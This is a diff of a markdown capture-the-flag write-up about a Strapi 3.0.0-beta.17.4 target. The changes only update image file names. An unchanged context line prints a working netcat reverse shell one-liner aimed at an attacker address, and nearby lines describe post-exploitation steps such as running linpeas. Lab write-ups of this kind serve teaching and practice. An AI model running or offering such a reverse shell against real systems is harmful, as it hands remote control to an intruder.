@@ -62,7 +62,7 @@ Doing a google search on <mark style="color:green;">`strapi`</mark> shows that i
 
 Great! Now hopefully we can find a version number somewhere...
 
-![](<../../../../.gitbook/assets/image (16).png>)
+![](<../../../../.gitbook/assets/image (16) (1).png>)
 
 It seems the current version of is <mark style="color:green;">`Strapi 3.0.0-beta.17.4`</mark>
 
@@ -108,7 +108,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.38 4444 >/tmp/f
 
 After upgrading my shell, I searched for the user.txt file
 
-![](<../../../../.gitbook/assets/image (46).png>)
+![](<../../../../.gitbook/assets/image (46) (1).png>)
 
 I ran linepeas.sh and noticed something interesting. Looks like there is MySQL running and something else on port 8000. What is that port used for?
 
